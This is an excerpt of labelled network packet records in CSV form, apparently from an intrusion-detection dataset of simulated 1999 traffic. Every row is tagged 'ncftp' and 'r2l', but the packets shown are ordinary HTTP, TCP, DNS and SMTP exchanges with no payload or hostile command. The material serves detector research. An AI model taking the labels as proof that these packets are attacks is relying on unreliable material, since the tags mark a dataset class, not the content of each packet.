"ncftp"," r2l", "414728","12:13:47.652819","172.16.117.103","207.37.243.56","HTTP","298","GET /french/images/hm_nav_bar.gif HTTP/1.0 "
"ncftp"," r2l", "414729","12:13:47.668512","194.27.251.21","172.16.112.100","TCP","60","20189 → 25 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414730","12:13:47.668685","172.16.112.100","194.27.251.21","TCP","60","25 → 20189 [SYN, ACK] Seq=0 Ack=1 Win=8760 Len=0 MSS=1460"
"ncftp"," r2l", "414731","12:13:47.669435","194.27.251.21","172.16.112.100","TCP","60","20189 → 25 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414732","12:13:47.670846","207.37.243.56","172.16.117.103","TCP","60","80 → 10434 [ACK] Seq=1 Ack=245 Win=32736 Len=0"
"ncftp"," r2l", "414733","12:13:47.671383","172.16.112.100","172.16.112.20","DNS","86","Standard query 0x0047 PTR 21.251.27.194.in-addr.arpa"
"ncftp"," r2l", "414734","12:13:47.671963","172.16.112.20","172.16.112.100","DNS","152","Standard query response 0x0047 No such name PTR 21.251.27.194.in-addr.arpa SOA aesop.world.net"
"ncftp"," r2l", "414735","12:13:47.672432","172.16.112.100","194.27.251.21","NBNS","92","Name query NBSTAT *<00><00><00><00><00><00><00><00><00><00><00><00><00><00><00>"
"ncftp"," r2l", "414736","12:13:47.673645","194.27.251.21","172.16.112.100","ICMP","120","Destination unreachable (Port unreachable)"
"ncftp"," r2l", "414737","12:13:47.678119","197.218.177.69","172.16.113.84","TCP","60","20250 → 25 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414738","12:13:47.678346","172.16.113.84","197.218.177.69","TCP","60","25 → 20250 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414739","12:13:47.679132","197.218.177.69","172.16.113.84","TCP","60","20250 → 25 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414740","12:13:47.689465","207.37.243.56","172.16.117.103","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414741","12:13:47.690687","207.37.243.56","172.16.117.103","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414742","12:13:47.691827","172.16.117.103","207.37.243.56","TCP","60","10434 → 80 [ACK] Seq=245 Ack=2921 Win=32120 Len=0"
"ncftp"," r2l", "414743","12:13:47.697699","207.37.243.56","172.16.117.103","HTTP","1394","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414744","12:13:47.697767","207.37.243.56","172.16.117.103","TCP","60","80 → 10434 [FIN, ACK] Seq=4261 Ack=245 Win=32736 Len=0"
"ncftp"," r2l", "414745","12:13:47.697971","172.16.117.103","207.37.243.56","TCP","60","10434 → 80 [ACK] Seq=245 Ack=4262 Win=30779 Len=0"
"ncftp"," r2l", "414746","12:13:47.701119","172.16.117.103","207.37.243.56","TCP","60","10434 → 80 [FIN, ACK] Seq=245 Ack=4262 Win=32120 Len=0"
"ncftp"," r2l", "414747","12:13:47.704617","207.37.243.56","172.16.117.103","TCP","60","80 → 10434 [ACK] Seq=4262 Ack=246 Win=32735 Len=0"
"ncftp"," r2l", "414748","12:13:47.706386","172.16.117.103","207.37.243.56","TCP","60","10497 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414749","12:13:47.710633","207.37.243.56","172.16.117.103","TCP","60","80 → 10497 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414750","12:13:47.710801","172.16.117.103","207.37.243.56","TCP","60","10497 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414751","12:13:47.711559","172.16.117.103","207.37.243.56","HTTP","299","GET /french/images/hm_btm_prol.gif HTTP/1.0 "
"ncftp"," r2l", "414752","12:13:47.729253","207.37.243.56","172.16.117.103","TCP","1078","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414753","12:13:47.729762","207.37.243.56","172.16.117.103","HTTP","612","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414754","12:13:47.729833","207.37.243.56","172.16.117.103","TCP","60","80 → 10497 [FIN, ACK] Seq=1583 Ack=246 Win=32736 Len=0"
"ncftp"," r2l", "414755","12:13:47.729972","172.16.117.103","207.37.243.56","TCP","60","10497 → 80 [ACK] Seq=246 Ack=1584 Win=30660 Len=0"
"ncftp"," r2l", "414756","12:13:47.731789","172.16.116.44","198.83.178.23","TCP","60","[TCP Retransmission] 10299 → 80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460"
"ncftp"," r2l", "414757","12:13:47.733014","172.16.117.103","207.37.243.56","TCP","60","10497 → 80 [FIN, ACK] Seq=246 Ack=1584 Win=32120 Len=0"
"ncftp"," r2l", "414758","12:13:47.734343","207.37.243.56","172.16.117.103","TCP","60","80 → 10497 [ACK] Seq=1584 Ack=247 Win=32735 Len=0"
"ncftp"," r2l", "414759","12:13:47.737548","172.16.117.103","207.37.243.56","TCP","60","10498 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414760","12:13:47.738583","198.83.178.23","172.16.116.44","TCP","60","80 → 10299 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414761","12:13:47.738748","172.16.116.44","198.83.178.23","TCP","60","10299 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414762","12:13:47.739202","172.16.116.44","198.83.178.23","HTTP","201","GET / HTTP/1.0 "
"ncftp"," r2l", "414763","12:13:47.739976","207.37.243.56","172.16.117.103","TCP","60","80 → 10498 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414764","12:13:47.740115","172.16.117.103","207.37.243.56","TCP","60","10498 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414765","12:13:47.740592","172.16.117.103","207.37.243.56","HTTP","288","GET /images/hm_hola.gif HTTP/1.0 "
"ncftp"," r2l", "414766","12:13:47.748198","172.16.113.84","197.218.177.69","SMTP","139","S: 220 duck.eyrie.af.mil Sendmail 4.1/SMI-4.1 ready at Wed, 31 Mar 1999 12:13:53 -0500"
"ncftp"," r2l", "414767","12:13:47.761372","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414768","12:13:47.762612","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414769","12:13:47.762683","207.37.243.56","172.16.117.103","TCP","60","80 → 10498 [ACK] Seq=1 Ack=235 Win=32502 Len=0"
"ncftp"," r2l", "414770","12:13:47.763405","197.218.177.69","172.16.113.84","TCP","60","20250 → 25 [ACK] Seq=1 Ack=86 Win=32120 Len=0"
"ncftp"," r2l", "414771","12:13:47.771773","172.16.116.44","198.83.178.23","TCP","60","10299 → 80 [ACK] Seq=148 Ack=2921 Win=32120 Len=0"
"ncftp"," r2l", "414772","12:13:47.773460","207.37.243.56","172.16.117.103","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414773","12:13:47.774322","207.37.243.56","172.16.117.103","HTTP","1055","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414774","12:13:47.774392","207.37.243.56","172.16.117.103","TCP","60","80 → 10498 [FIN, ACK] Seq=2462 Ack=235 Win=32736 Len=0"
"ncftp"," r2l", "414775","12:13:47.774552","172.16.117.103","207.37.243.56","TCP","60","10498 → 80 [ACK] Seq=235 Ack=2463 Win=30660 Len=0"
"ncftp"," r2l", "414776","12:13:47.779050","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414777","12:13:47.779123","172.16.117.103","207.37.243.56","TCP","60","10498 → 80 [FIN, ACK] Seq=235 Ack=2463 Win=32120 Len=0"
"ncftp"," r2l", "414778","12:13:47.780366","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414779","12:13:47.781584","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414780","12:13:47.781830","172.16.116.44","198.83.178.23","TCP","60","10299 → 80 [ACK] Seq=148 Ack=7301 Win=30660 Len=0"
"ncftp"," r2l", "414781","12:13:47.783418","207.37.243.56","172.16.117.103","TCP","60","80 → 10498 [ACK] Seq=2463 Ack=236 Win=32735 Len=0"
"ncftp"," r2l", "414782","12:13:47.786724","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414783","12:13:47.787484","198.83.178.23","172.16.116.44","TCP","897","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414784","12:13:47.787576","198.83.178.23","172.16.116.44","HTTP","60","HTTP/1.1 200 OK  (text/html)"
"ncftp"," r2l", "414785","12:13:47.787719","172.16.117.103","207.37.243.56","TCP","60","10499 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414786","12:13:47.787788","172.16.116.44","198.83.178.23","TCP","60","10299 → 80 [ACK] Seq=148 Ack=9605 Win=30660 Len=0"
"ncftp"," r2l", "414787","12:13:47.788600","172.16.116.44","198.83.178.23","TCP","60","10299 → 80 [FIN, ACK] Seq=148 Ack=9605 Win=32120 Len=0"
"ncftp"," r2l", "414788","12:13:47.791976","207.37.243.56","172.16.117.103","TCP","60","80 → 10499 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414789","12:13:47.792156","172.16.117.103","207.37.243.56","TCP","60","10499 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414790","12:13:47.793842","198.83.178.23","172.16.116.44","TCP","60","80 → 10299 [ACK] Seq=9605 Ack=149 Win=32735 Len=0"
"ncftp"," r2l", "414791","12:13:47.810963","172.16.116.44","198.83.178.23","TCP","60","10506 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414792","12:13:47.811553","172.16.117.103","207.37.243.56","HTTP","293","GET /images/hm_btm_arw01.gif HTTP/1.0 "
"ncftp"," r2l", "414793","12:13:47.815721","198.83.178.23","172.16.116.44","TCP","60","80 → 10506 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414794","12:13:47.815898","172.16.116.44","198.83.178.23","TCP","60","10506 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414795","12:13:47.816545","172.16.116.44","198.83.178.23","HTTP","260","GET /SEL/img/wireless/wir.gif HTTP/1.0 "
"ncftp"," r2l", "414796","12:13:47.830822","198.83.178.23","172.16.116.44","TCP","60","80 → 10506 [ACK] Seq=1 Ack=207 Win=32530 Len=0"
"ncftp"," r2l", "414797","12:13:47.831025","207.37.243.56","172.16.117.103","TCP","60","80 → 10499 [ACK] Seq=1 Ack=240 Win=32736 Len=0"
"ncftp"," r2l", "414798","12:13:47.839500","207.37.243.56","172.16.117.103","HTTP","702","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"ncftp"," r2l", "414799","12:13:47.839568","207.37.243.56","172.16.117.103","TCP","60","80 → 10499 [FIN, ACK] Seq=649 Ack=240 Win=32736 Len=0"
"ncftp"," r2l", "414800","12:13:47.839733","172.16.117.103","207.37.243.56","TCP","60","10499 → 80 [ACK] Seq=240 Ack=650 Win=31471 Len=0"
"ncftp"," r2l", "414801","12:13:47.843215","172.16.117.103","207.37.243.56","TCP","60","10499 → 80 [FIN, ACK] Seq=240 Ack=650 Win=32120 Len=0"
"ncftp"," r2l", "414802","12:13:47.846759","207.37.243.56","172.16.117.103","TCP","60","80 → 10499 [ACK] Seq=650 Ack=241 Win=32735 Len=0"
"ncftp"," r2l", "414803","12:13:47.858846","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414804","12:13:47.859940","198.83.178.23","172.16.116.44","HTTP","1344","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414805","12:13:47.860012","198.83.178.23","172.16.116.44","TCP","60","80 → 10506 [FIN, ACK] Seq=2751 Ack=207 Win=32736 Len=0"
"ncftp"," r2l", "414806","12:13:47.860191","172.16.116.44","198.83.178.23","TCP","60","10506 → 80 [ACK] Seq=207 Ack=2752 Win=30660 Len=0"
"ncftp"," r2l", "414807","12:13:47.878585","172.16.116.44","198.83.178.23","TCP","60","10506 → 80 [FIN, ACK] Seq=207 Ack=2752 Win=32120 Len=0"
"ncftp"," r2l", "414808","12:13:47.881576","172.16.116.44","198.83.178.23","TCP","60","10510 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414809","12:13:47.882404","198.83.178.23","172.16.116.44","TCP","60","80 → 10506 [ACK] Seq=2752 Ack=208 Win=32735 Len=0"
"ncftp"," r2l", "414810","12:13:47.884351","198.83.178.23","172.16.116.44","TCP","60","80 → 10510 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414811","12:13:47.884508","172.16.116.44","198.83.178.23","TCP","60","10510 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414812","12:13:47.884947","172.16.116.44","198.83.178.23","HTTP","252","GET /SEL/img/srch.gif HTTP/1.0 "
"ncftp"," r2l", "414813","12:13:47.885361","172.16.117.103","207.37.243.56","TCP","60","10511 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414814","12:13:47.889753","207.37.243.56","172.16.117.103","TCP","60","80 → 10511 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414815","12:13:47.889914","172.16.117.103","207.37.243.56","TCP","60","10511 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414816","12:13:47.890447","172.16.117.103","207.37.243.56","HTTP","298","GET /images/hm_factoids_02_01.gif HTTP/1.0 "
"ncftp"," r2l", "414817","12:13:47.900817","198.83.178.23","172.16.116.44","TCP","60","80 → 10510 [ACK] Seq=1 Ack=199 Win=32736 Len=0"
"ncftp"," r2l", "414818","12:13:47.907524","198.83.178.23","172.16.116.44","HTTP","1038","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"ncftp"," r2l", "414819","12:13:47.907591","198.83.178.23","172.16.116.44","TCP","60","80 → 10510 [FIN, ACK] Seq=985 Ack=199 Win=32736 Len=0"
"ncftp"," r2l", "414820","12:13:47.907766","172.16.116.44","198.83.178.23","TCP","60","10510 → 80 [ACK] Seq=199 Ack=986 Win=31135 Len=0"
"ncftp"," r2l", "414821","12:13:47.908573","172.16.116.44","198.83.178.23","TCP","60","10510 → 80 [FIN, ACK] Seq=199 Ack=986 Win=32120 Len=0"
"ncftp"," r2l", "414822","12:13:47.911369","172.16.116.44","198.83.178.23","TCP","60","10512 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414823","12:13:47.912708","198.83.178.23","172.16.116.44","TCP","60","80 → 10510 [ACK] Seq=986 Ack=200 Win=32735 Len=0"
"ncftp"," r2l", "414824","12:13:47.914642","198.83.178.23","172.16.116.44","TCP","60","80 → 10512 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414825","12:13:47.914819","172.16.116.44","198.83.178.23","TCP","60","10512 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414826","12:13:47.914890","207.37.243.56","172.16.117.103","TCP","60","80 → 10511 [ACK] Seq=1 Ack=245 Win=32736 Len=0"
"ncftp"," r2l", "414827","12:13:47.915649","172.16.116.44","198.83.178.23","HTTP","256","GET /SEL/img/specials.gif HTTP/1.0 "
"ncftp"," r2l", "414828","12:13:47.921647","207.37.243.56","172.16.117.103","TCP","241","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414829","12:13:47.921697","207.37.243.56","172.16.117.103","HTTP","60","HTTP/1.1 404 File Not Found  (text/html)"
"ncftp"," r2l", "414830","12:13:47.921835","172.16.117.103","207.37.243.56","TCP","60","10511 → 80 [ACK] Seq=245 Ack=189 Win=31932 Len=0"
"ncftp"," r2l", "414831","12:13:47.927430","172.16.117.103","207.37.243.56","TCP","60","10511 → 80 [FIN, ACK] Seq=245 Ack=189 Win=32120 Len=0"
"ncftp"," r2l", "414832","12:13:47.927711","172.16.117.103","207.37.243.56","TCP","60","10518 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414833","12:13:47.931044","207.37.243.56","172.16.117.103","TCP","60","80 → 10511 [ACK] Seq=189 Ack=246 Win=32735 Len=0"
"ncftp"," r2l", "414834","12:13:47.932388","207.37.243.56","172.16.117.103","TCP","60","80 → 10518 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414835","12:13:47.932546","172.16.117.103","207.37.243.56","TCP","60","10518 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414836","12:13:47.932627","198.83.178.23","172.16.116.44","TCP","60","80 → 10512 [ACK] Seq=1 Ack=203 Win=32736 Len=0"
"ncftp"," r2l", "414837","12:13:47.933079","172.16.117.103","207.37.243.56","HTTP","293","GET /images/hm_btm_arw02.gif HTTP/1.0 "
"ncftp"," r2l", "414838","12:13:47.946403","198.83.178.23","172.16.116.44","HTTP","903","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"ncftp"," r2l", "414839","12:13:47.946470","198.83.178.23","172.16.116.44","TCP","60","80 → 10512 [FIN, ACK] Seq=850 Ack=203 Win=32736 Len=0"
"ncftp"," r2l", "414840","12:13:47.946682","172.16.116.44","198.83.178.23","TCP","60","10512 → 80 [ACK] Seq=203 Ack=851 Win=31270 Len=0"
"ncftp"," r2l", "414841","12:13:47.950792","207.37.243.56","172.16.117.103","TCP","60","80 → 10518 [ACK] Seq=1 Ack=240 Win=32736 Len=0"
"ncftp"," r2l", "414842","12:13:47.967040","207.37.243.56","172.16.117.103","HTTP","702","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"ncftp"," r2l", "414843","12:13:47.967111","207.37.243.56","172.16.117.103","TCP","60","80 → 10518 [FIN, ACK] Seq=649 Ack=240 Win=32736 Len=0"
"ncftp"," r2l", "414844","12:13:47.967296","172.16.117.103","207.37.243.56","TCP","60","10518 → 80 [ACK] Seq=240 Ack=650 Win=31471 Len=0"
"ncftp"," r2l", "414845","12:13:47.969641","172.16.116.44","198.83.178.23","TCP","60","10512 → 80 [FIN, ACK] Seq=203 Ack=851 Win=32120 Len=0"
"ncftp"," r2l", "414846","12:13:47.971950","198.83.178.23","172.16.116.44","TCP","60","80 → 10512 [ACK] Seq=851 Ack=204 Win=32735 Len=0"
"ncftp"," r2l", "414847","12:13:47.972922","172.16.116.44","198.83.178.23","TCP","60","10522 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414848","12:13:47.973467","172.16.117.103","207.37.243.56","TCP","60","10518 → 80 [FIN, ACK] Seq=240 Ack=650 Win=32120 Len=0"
"ncftp"," r2l", "414849","12:13:47.976171","198.83.178.23","172.16.116.44","TCP","60","80 → 10522 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414850","12:13:47.976342","172.16.116.44","198.83.178.23","TCP","60","10522 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414851","12:13:47.976827","172.16.116.44","198.83.178.23","HTTP","261","GET /SEL/img/semicon_off_3.gif HTTP/1.0 "
"ncftp"," r2l", "414852","12:13:47.976909","207.37.243.56","172.16.117.103","TCP","60","80 → 10518 [ACK] Seq=650 Ack=241 Win=32735 Len=0"
"ncftp"," r2l", "414853","12:13:47.978893","172.16.117.103","207.37.243.56","TCP","60","10523 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414854","12:13:47.982216","207.37.243.56","172.16.117.103","TCP","60","80 → 10523 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414855","12:13:47.982381","172.16.117.103","207.37.243.56","TCP","60","10523 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414856","12:13:47.983027","172.16.117.103","207.37.243.56","HTTP","293","GET /images/hm_btm_arw03.gif HTTP/1.0 "
"ncftp"," r2l", "414857","12:13:47.999982","198.83.178.23","172.16.116.44","TCP","1078","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414858","12:13:48.000318","198.83.178.23","172.16.116.44","HTTP","394","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414859","12:13:48.000386","198.83.178.23","172.16.116.44","TCP","60","80 → 10522 [FIN, ACK] Seq=1365 Ack=208 Win=32736 Len=0"
"ncftp"," r2l", "414860","12:13:48.000541","172.16.116.44","198.83.178.23","TCP","60","10522 → 80 [ACK] Seq=208 Ack=1366 Win=30755 Len=0"
"ncftp"," r2l", "414861","12:13:48.000819","207.37.243.56","172.16.117.103","TCP","60","80 → 10523 [ACK] Seq=1 Ack=240 Win=32736 Len=0"
"ncftp"," r2l", "414862","12:13:48.001413","172.16.116.44","198.83.178.23","TCP","60","10522 → 80 [FIN, ACK] Seq=208 Ack=1366 Win=32120 Len=0"
"ncftp"," r2l", "414863","12:13:48.004568","172.16.116.44","198.83.178.23","TCP","60","10562 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414864","12:13:48.005725","198.83.178.23","172.16.116.44","TCP","60","80 → 10522 [ACK] Seq=1366 Ack=209 Win=32735 Len=0"
"ncftp"," r2l", "414865","12:13:48.007657","198.83.178.23","172.16.116.44","TCP","60","80 → 10562 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414866","12:13:48.007812","172.16.116.44","198.83.178.23","TCP","60","10562 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414867","12:13:48.008326","172.16.116.44","198.83.178.23","HTTP","264","GET /SEL/img/electronics/elec.gif HTTP/1.0 "
"ncftp"," r2l", "414868","12:13:48.023586","207.37.243.56","172.16.117.103","HTTP","702","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"ncftp"," r2l", "414869","12:13:48.023655","207.37.243.56","172.16.117.103","TCP","60","80 → 10523 [FIN, ACK] Seq=649 Ack=240 Win=32736 Len=0"
"ncftp"," r2l", "414870","12:13:48.023862","172.16.117.103","207.37.243.56","TCP","60","10523 → 80 [ACK] Seq=240 Ack=650 Win=31471 Len=0"
"ncftp"," r2l", "414871","12:13:48.030791","198.83.178.23","172.16.116.44","TCP","60","80 → 10562 [ACK] Seq=1 Ack=211 Win=32736 Len=0"
"ncftp"," r2l", "414872","12:13:48.037120","172.16.117.103","207.37.243.56","TCP","60","10523 → 80 [FIN, ACK] Seq=240 Ack=650 Win=32120 Len=0"
"ncftp"," r2l", "414873","12:13:48.040650","207.37.243.56","172.16.117.103","TCP","60","80 → 10523 [ACK] Seq=650 Ack=241 Win=32735 Len=0"
"ncftp"," r2l", "414874","12:13:48.042845","172.16.117.103","207.37.243.56","TCP","60","10563 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414875","12:13:48.047098","207.37.243.56","172.16.117.103","TCP","60","80 → 10563 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414876","12:13:48.047262","172.16.117.103","207.37.243.56","TCP","60","10563 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414877","12:13:48.047882","172.16.117.103","207.37.243.56","HTTP","295","GET /images/hm_ligne1_col2.gif HTTP/1.0 "
"ncftp"," r2l", "414878","12:13:48.062528","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414879","12:13:48.063757","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414880","12:13:48.070759","207.37.243.56","172.16.117.103","TCP","60","80 → 10563 [ACK] Seq=1 Ack=242 Win=32736 Len=0"
"ncftp"," r2l", "414881","12:13:48.071733","172.16.116.44","198.83.178.23","TCP","60","10562 → 80 [ACK] Seq=211 Ack=2921 Win=32120 Len=0"
"ncftp"," r2l", "414882","12:13:48.077739","198.83.178.23","172.16.116.44","HTTP","1263","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414883","12:13:48.077807","198.83.178.23","172.16.116.44","TCP","60","80 → 10562 [FIN, ACK] Seq=4130 Ack=211 Win=32736 Len=0"
"ncftp"," r2l", "414884","12:13:48.077977","172.16.116.44","198.83.178.23","TCP","60","10562 → 80 [ACK] Seq=211 Ack=4131 Win=30910 Len=0"
"ncftp"," r2l", "414885","12:13:48.078547","172.16.116.44","198.83.178.23","TCP","60","10562 → 80 [FIN, ACK] Seq=211 Ack=4131 Win=32120 Len=0"
"ncftp"," r2l", "414886","12:13:48.081869","172.16.116.44","198.83.178.23","TCP","60","10570 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414887","12:13:48.082871","198.83.178.23","172.16.116.44","TCP","60","80 → 10562 [ACK] Seq=4131 Ack=212 Win=32735 Len=0"
"ncftp"," r2l", "414888","12:13:48.084802","198.83.178.23","172.16.116.44","TCP","60","80 → 10570 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414889","12:13:48.084964","172.16.116.44","198.83.178.23","TCP","60","10570 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414890","12:13:48.085548","172.16.116.44","198.83.178.23","HTTP","253","GET /SEL/img/back2.gif HTTP/1.0 "
"ncftp"," r2l", "414891","12:13:48.098113","207.37.243.56","172.16.117.103","HTTP","475","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"ncftp"," r2l", "414892","12:13:48.098179","207.37.243.56","172.16.117.103","TCP","60","80 → 10563 [FIN, ACK] Seq=422 Ack=242 Win=32736 Len=0"
"ncftp"," r2l", "414893","12:13:48.098349","172.16.117.103","207.37.243.56","TCP","60","10563 → 80 [ACK] Seq=242 Ack=423 Win=31698 Len=0"
"ncftp"," r2l", "414894","12:13:48.099130","172.16.117.103","207.37.243.56","TCP","60","10563 → 80 [FIN, ACK] Seq=242 Ack=423 Win=32120 Len=0"
"ncftp"," r2l", "414895","12:13:48.102651","207.37.243.56","172.16.117.103","TCP","60","80 → 10563 [ACK] Seq=423 Ack=243 Win=32735 Len=0"
"ncftp"," r2l", "414896","12:13:48.102857","198.83.178.23","172.16.116.44","TCP","60","80 → 10570 [ACK] Seq=1 Ack=200 Win=32537 Len=0"
"ncftp"," r2l", "414897","12:13:48.103697","172.16.117.103","207.37.243.56","TCP","60","10574 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414898","12:13:48.106268","207.37.243.56","172.16.117.103","TCP","60","80 → 10574 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414899","12:13:48.106438","172.16.117.103","207.37.243.56","TCP","60","10574 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
